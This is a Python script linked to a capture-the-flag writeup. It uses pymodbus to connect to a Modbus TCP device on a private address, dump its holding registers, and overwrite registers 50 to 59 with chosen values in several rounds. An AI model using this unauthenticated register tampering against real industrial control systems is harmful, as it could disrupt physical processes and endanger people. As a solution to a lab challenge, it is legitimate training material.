# https://ctftime.org/writeup/37278

from pymodbus.client import ModbusTcpClient

# Modbus server IP address and port
SERVER_IP = "192.168.4.1"
SERVER_PORT = 502

# Modbus device ID (slave address)
DEVICE_ID = 1

# Register addresses and corresponding values to write
register_values = {
    50: 53,
    51: 98,
    52: 53,
    53: 100,
    54: 54,
    55: 54,
    56: 57,
    57: 56,
    58: 101,
    59: 94,
}

# Starting address and number of registers to read
START_ADDRESS = 0
NUM_REGISTERS = 99


def read_regs(client, start, num):
    try:
        # Connect to the Modbus server
        client.connect()
    
        # Read Modbus data
        response = client.read_holding_registers(START_ADDRESS, NUM_REGISTERS, unit=DEVICE_ID)
    
        if not response.isError():
            # Process the read data
            data = response.registers
            for i, value in enumerate(data):
                register_address = START_ADDRESS + i
                print(f'Register {register_address}: {value}')
        else:
            print(f'Error reading Modbus data: {response.message}')
    
    except Exception as e:
        print(f'Error: {str(e)}')
        client.close()

def write_regs(client, regs):
    try:
        # Connect to the Modbus server
        client.connect()
    
        # Write values to Modbus registers
        for register_address, value in regs.items():
            response = client.write_register(register_address, value, unit=DEVICE_ID)
    
            if not response.isError():
                print(f'Successfully wrote value {value} to register {register_address}')
            else:
                print(f'Error writing to register {register_address}: {response.message}')
    
    except Exception as e:
        print(f'Error: {str(e)}')
        client.close()

# Create a Modbus TCP client
client = ModbusTcpClient(SERVER_IP, SERVER_PORT)

read_regs(client, START_ADDRESS, NUM_REGISTERS)
write_regs(client, register_values)
read_regs(client, START_ADDRESS, NUM_REGISTERS)

register_values = {
    50: 65,
    51: 65,
    52: 65,
    53: 65,
    54: 65,
    55: 65,
    56: 65,
    57: 65,
    58: 65,
    59: 65,
}

write_regs(client, register_values)
read_regs(client, START_ADDRESS, NUM_REGISTERS)

register_values = {
    50: 0,
    51: 86,
    52: 52,
    53: 103,
}

write_regs(client, register_values)
read_regs(client, START_ADDRESS, NUM_REGISTERS)

client.close()
